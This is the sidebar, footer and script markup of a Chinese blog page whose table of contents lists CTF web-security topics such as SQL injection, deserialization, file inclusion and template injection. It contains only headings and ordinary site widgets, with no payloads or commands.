class="toc-text">传参涉及的php函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.1.</span> <span class="toc-text">可执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.2.</span> <span class="toc-text">可回调函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.4.3.</span> <span class="toc-text">字符拼接绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87"><span class="toc-number">3.4.4.</span> <span class="toc-text">字符串转义绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E5%8F%82%E7%BB%95%E8%BF%87%E6%80%BB%E9%9B%86%E2%80%93self"><span class="toc-number">3.4.5.</span> <span class="toc-text">传参绕过总集–self</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%B1%BB%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">3.4.6.</span> <span class="toc-text">PHP类方法调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%BB%95%E8%BF%87preg-replace%E7%9A%84-e%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.4.7.</span> <span class="toc-text">PHP绕过preg_replace的\e模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E6%8C%89%E4%BD%8D%E5%8F%96%E6%B3%95%E8%BF%90%E7%AE%97%E7%AC%A6%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-number">3.4.8.</span> <span class="toc-text">php按位取法运算符绕过限制 ~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%BC%82%E6%88%96%E9%9D%9Eascii%E4%B8%8Eascii%E7%BB%95%E8%BF%87%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%B8%8B%E5%88%92%E7%BA%BF%E9%99%90%E5%88%B6"><span class="toc-number">3.4.9.</span> <span class="toc-text">php异或非ascii与ascii绕过字母数字下划线限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC1-%E7%90%86%E8%A7%A3"><span class="toc-number">3.4.9.1.</span> <span class="toc-text">脚本1+理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC2"><span class="toc-number">3.4.9.2.</span> <span class="toc-text">脚本2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-autoload%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.5.</span> <span class="toc-text">关于__autoload魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E7%A0%81%E7%B1%BB"><span class="toc-number">3.6.</span> <span class="toc-text">解码类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4"><span class="toc-number">3.7.</span> <span class="toc-text">Linux命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%89%B9%E6%AE%8A%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">3.7.1.</span> <span class="toc-text">Linux特殊利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4"><span class="toc-number">3.7.2.</span> <span class="toc-text">Linux内置命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.7.3.</span> <span class="toc-text">Linux命令盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.</span> <span class="toc-text">Linux命令绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.2.</span> <span class="toc-text">敏感字符串绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.3.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PROC%E8%BD%AF%E9%93%BE%E6%8E%A5%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.4.</span> <span class="toc-text">PROC软链接溢出绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Linux%E5%91%BD%E4%BB%A4"><span class="toc-number">3.9.</span> <span class="toc-text">PHP-Linux命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.10.</span> <span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-%E7%AE%80%E8%BF%B0"><span class="toc-number">3.10.1.</span> <span class="toc-text">概述&#x2F;简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%83%A8%E5%88%86%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.10.2.</span> <span class="toc-text">详细解部分伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%89%B9%E6%80%A7"><span class="toc-number">3.11.</span> <span class="toc-text">php特性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.1.</span> <span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.1.</span> <span class="toc-text">依赖函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.2.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.3.</span> <span class="toc-text">魔术方法的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">4.1.4.</span> <span class="toc-text">垃圾回收机制,反序列化之字符逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.2.</span> <span class="toc-text">JAVA反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">5.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%87%BD%E6%95%B0%E5%8C%85%E5%90%AB"><span class="toc-number">5.1.</span> <span class="toc-text">php函数包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">5.2.</span> <span class="toc-text">日志包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E5%87%BD%E6%95%B0"><span class="toc-number">6.</span> <span class="toc-text">python函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%B3%A8%E7%82%B9%E7%9F%A5%E8%AF%86"><span class="toc-number">7.1.</span> <span class="toc-text">其它注点知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#join%E8%AF%AD%E6%B3%95"><span class="toc-number">7.1.1.</span> <span class="toc-text">join语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#like%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="toc-number">7.1.2.</span> <span class="toc-text">like语法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#having%E8%AF%AD%E6%B3%95"><span class="toc-number">7.1.3.</span> <span class="toc-text">having语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E9%99%90%E5%88%B6-%E6%95%B0%E5%AD%97%E8%BE%93%E5%85%A5"><span class="toc-number">7.1.4.</span> <span class="toc-text">布尔绕过数字限制&#x2F;数字输入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concat%E5%B7%A7%E7%94%A8"><span class="toc-number">7.1.5.</span> <span class="toc-text">concat巧用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#group-concat%E5%90%88%E5%B9%B6%E5%88%97"><span class="toc-number">7.1.6.</span> <span class="toc-text">group_concat合并列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81"><span class="toc-number">7.1.7.</span> <span class="toc-text">base64编码解码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">7.2.</span> <span class="toc-text">万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#md5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">7.2.1.</span> <span class="toc-text">md5万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">7.2.2.</span> <span class="toc-text">0账户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#regexp%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">7.2.3.</span> <span class="toc-text">regexp正则表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file%E8%AF%BB%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">7.2.4.</span> <span class="toc-text">load_file读取服务器本地文件内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">7.2.5.</span> <span class="toc-text">截断字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E4%BD%8D%E7%BD%AE%E6%88%AA%E6%96%AD%E6%8C%87%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2-substr-substring-mid"><span class="toc-number">7.2.5.1.</span> <span class="toc-text">指定位置截断指定字符串-substr&#x2F;substring&#x2F;mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%89%E5%AD%97%E7%AC%A6%E5%B7%A6%E5%8F%B3%E6%88%AA%E6%96%AD-left-right"><span class="toc-number">7.2.5.2.</span> <span class="toc-text">按字符左右截断-left&#x2F;right</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E5%87%BA%E6%8C%87%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">7.2.5.3.</span> <span class="toc-text">查出指定字符串第一次出现的位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">7.2.6.</span> <span class="toc-text">替换字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">7.3.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#update%E5%A0%86%E5%8F%A0%E6%9B%B4%E6%96%B0%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">7.3.1.</span> <span class="toc-text">update堆叠更新用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#select%E7%BB%95%E8%BF%87%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81"><span class="toc-number">7.3.2.</span> <span class="toc-text">select绕过密码验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E8%A1%A8%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.3.</span> <span class="toc-text">单表用户登录绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.4.</span> <span class="toc-text">修改字段名进行绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%83%85%E5%86%B51%EF%BC%9A"><span class="toc-number">7.3.4.1.</span> <span class="toc-text">情况1：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%83%85%E5%86%B52%EF%BC%9A%E4%BA%A4%E6%8D%A2%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%B7%B2%E6%B3%84%E9%9C%B2%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E4%BD%9C%E4%B8%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-number">7.3.4.2.</span> <span class="toc-text">情况2：交换字段名，使用已泄露的用户名作为密码登录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0-%E5%88%9B-%E6%8F%92"><span class="toc-number">7.3.5.</span> <span class="toc-text">删+创+插</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%8C%87%E5%AE%9A%E8%A1%A8%EF%BC%88%E5%8D%B1%E9%99%A9%E6%93%8D%E4%BD%9C%EF%BC%89"><span class="toc-number">7.3.5.1.</span> <span class="toc-text">删除指定表（危险操作）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E5%88%9B%E5%BB%BA%E6%8C%87%E5%AE%9A%E8%A1%A8"><span class="toc-number">7.3.5.2.</span> <span class="toc-text">重新创建指定表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E8%AF%AD%E5%8F%A5%E5%8F%AF%E4%BB%A5%E6%97%A0init"><span class="toc-number">7.3.5.3.</span> <span class="toc-text">插入语句可以无init</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.4.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-sleep"><span class="toc-number">7.4.1.</span> <span class="toc-text">SQL-sleep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#benchmark%E5%A4%A7%E9%87%8F%E8%AE%A1%E7%AE%97%E5%85%85%E5%BD%93%E5%BB%B6%E8%BF%9F"><span class="toc-number">7.4.2.</span> <span class="toc-text">benchmark大量计算充当延迟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E2%80%93%E5%A4%A7%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%BD%A2%E6%88%90%E5%BB%B6%E6%97%B6"><span class="toc-number">7.4.3.</span> <span class="toc-text">笛卡尔积–大量查询形成延时</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">7.5.</span> <span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">7.6.</span> <span class="toc-text">注入函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%B3%A8%E5%85%A5-%EF%BC%88limit%EF%BC%89"><span class="toc-number">7.7.</span> <span class="toc-text">其它注入-（limit）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-number">7.7.1.</span> <span class="toc-text">limit注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#into"><span class="toc-number">7.7.1.1.</span> <span class="toc-text">into</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#procedure"><span class="toc-number">7.7.1.2.</span> <span class="toc-text">procedure</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%EF%BC%88SQLMAP%EF%BC%89"><span class="toc-number">7.8.</span> <span class="toc-text">注入工具（SQLMAP）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLmap"><span class="toc-number">7.8.1.</span> <span class="toc-text">SQLmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-%E4%BD%BF%E7%94%A8%E8%BF%87%E7%9A%84sqlmap%E8%AF%AD%E6%B3%95"><span class="toc-number">7.8.1.1.</span> <span class="toc-text">常用&#x2F;使用过的sqlmap语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLmap%E5%86%85%E7%BD%AE%E8%84%9A%E6%9C%AC"><span class="toc-number">7.8.1.2.</span> <span class="toc-text">SQLmap内置脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">7.8.1.3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E6%8F%92%E4%BB%B6"><span class="toc-number">7.8.1.4.</span> <span class="toc-text">部分插件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%A1%88"><span class="toc-number">7.8.2.</span> <span class="toc-text">绕过方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python"><span class="toc-number">7.8.2.1.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql"><span class="toc-number">7.8.2.2.</span> <span class="toc-text">mysql</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">模板漏洞&#x2F;模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-number">8.1.</span> <span class="toc-text">判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">8.2.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-1"><span class="toc-number">8.3.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA"><span class="toc-number">8.4.</span> <span class="toc-text">JAVA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSI%E8%AF%AD%E6%B3%95%E2%80%93shtml"><span class="toc-number">8.5.</span> <span class="toc-text">SSI语法–shtml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.6.</span> <span class="toc-text">XXE漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">前端绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">10.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-idna%E7%BC%96%E7%A0%81%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC"><span class="toc-number">10.1.</span> <span class="toc-text">Python idna编码爆破脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E4%B8%93%E9%A2%98"><span class="toc-number">11.</span> <span class="toc-text">windows专题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd%E5%91%BD%E4%BB%A4"><span class="toc-number">11.1.</span> <span class="toc-text">cmd命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shift%E8%BF%9E%E6%8C%89%E4%BA%94%E6%AC%A1%E7%9A%84%E6%BB%9E%E7%95%99%E9%94%AE%E6%94%BB%E5%87%BB"><span class="toc-number">11.2.</span> <span class="toc-text">shift连按五次的滞留键攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">12.</span> <span class="toc-text">正则表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%90%E4%BA%9B%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="toc-number">12.1.</span> <span class="toc-text">某些通用格式匹配</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%8C%B9%E9%85%8D"><span class="toc-number">12.2.</span> <span class="toc-text">修饰符匹配</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%94%E8%AF%A5%E7%95%99%E7%82%B9%E5%BF%83%E7%9A%84%E8%B5%9B%E9%A2%98"><span class="toc-number">13.</span> <span class="toc-text">应该留点心的赛题</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/02/12/C-Study-0002/" title="C-Study-0002"><img src="/img/backgroude/b27.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C-Study-0002"/></a><div class="content"><a class="title" href="/2024/02/12/C-Study-0002/" title="C-Study-0002">C-Study-0002</a><time datetime="2024-02-12T15:29:22.000Z" title="发表于 2024-02-12 23:29:22">2024-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/09/PenetrationTestingStudy-00001/" title="渗透测试学习-00001"><img src="/img/backgroude/b43.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试学习-00001"/></a><div class="content"><a class="title" href="/2024/02/09/PenetrationTestingStudy-00001/" title="渗透测试学习-00001">渗透测试学习-00001</a><time datetime="2024-02-09T15:19:42.000Z" title="发表于 2024-02-09 23:19:42">2024-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/08/C-Study-0001/" title="C-Study-0001"><img src="/img/backgroude/b26.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C-Study-0001"/></a><div class="content"><a class="title" href="/2024/02/08/C-Study-0001/" title="C-Study-0001">C-Study-0001</a><time datetime="2024-02-08T06:57:11.000Z" title="发表于 2024-02-08 14:57:11">2024-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/07/CTF-Pwn-book-0001/" title="CTF-Pwn-总结-0001"><img src="/img/backgroude/b14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-Pwn-总结-0001"/></a><div class="content"><a class="title" href="/2024/02/07/CTF-Pwn-book-0001/" title="CTF-Pwn-总结-0001">CTF-Pwn-总结-0001</a><time datetime="2024-02-06T22:41:54.000Z" title="发表于 2024-02-07 06:41:54">2024-02-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/06/Pwn-study-0001/" title="Pwn-题目学习-0001"><img src="/img/backgroude/b31.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwn-题目学习-0001"/></a><div class="content"><a class="title" href="/2024/02/06/Pwn-study-0001/" title="Pwn-题目学习-0001">Pwn-题目学习-0001</a><time datetime="2024-02-06T14:04:11.000Z" title="发表于 2024-02-06 22:04:11">2024-02-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 矢幽武</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://linxiao-wangchuan.vercel.app/',
      region: 'ap-shanghai',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, {"emotion":"twemoji","placeholder":"在此处输入评论"}))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://linxiao-wangchuan.vercel.app/',
      region: 'ap-shanghai',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || ![object Object]) {
    if ([object Object]) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script src="/js/sun_moon.js" async></script><div class="aplayer no-destroy" data-id="5183531430" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><div class="aplayer no-destroy" data-id="5183531430" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" 